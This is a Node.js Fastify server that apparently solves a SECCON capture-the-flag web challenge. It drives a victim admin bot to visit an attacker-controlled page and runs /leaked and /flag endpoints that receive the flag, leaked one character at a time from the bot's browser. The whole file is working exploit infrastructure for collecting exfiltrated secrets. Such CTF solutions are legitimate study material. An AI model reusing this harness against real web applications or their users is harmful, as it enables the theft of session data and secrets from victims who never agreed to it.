const fastify = require("fastify")();
const path = require("node:path");

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? fail("No BOT_BASE_URL");
const ATTACKER_BASE_URL =
  process.env.ATTACKER_BASE_URL ?? fail("No ATTACKER_BASE_URL");
const PORT = "8080";

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const start = async () => {
  let known = "SECCON{";

  fastify.register(require("@fastify/static"), {
    root: path.join(__dirname, "public"),
  });

  fastify.post("/debug", async (req, reply) => {
    console.debug("DEBUG:", req.body.trim());
    return "";
  });

  fastify.post("/leaked", async (req, reply) => {
    known = req.body.trim();
    console.log(known);
    return "";
  });

  fastify.post("/flag", async (req, reply) => {
    // You got a flag!
    console.log("Flag:", req.body);
    process.exit(0);
  });

  fastify.listen({ port: PORT, host: "0.0.0.0" }, async (err, address) => {
    if (err) fail(err.toString());

    await sleep(3 * 1000);
    for (let i = 0; i < 5; i++) {
      console.log(`Report ${i + 1}:`);
      await reportUrl(
        `${ATTACKER_BASE_URL}?${new URLSearchParams({
          baseUrl: "http://web:3000",
          known,
        })}`
      );
    }

    fail("Failed");
  });
};
start();
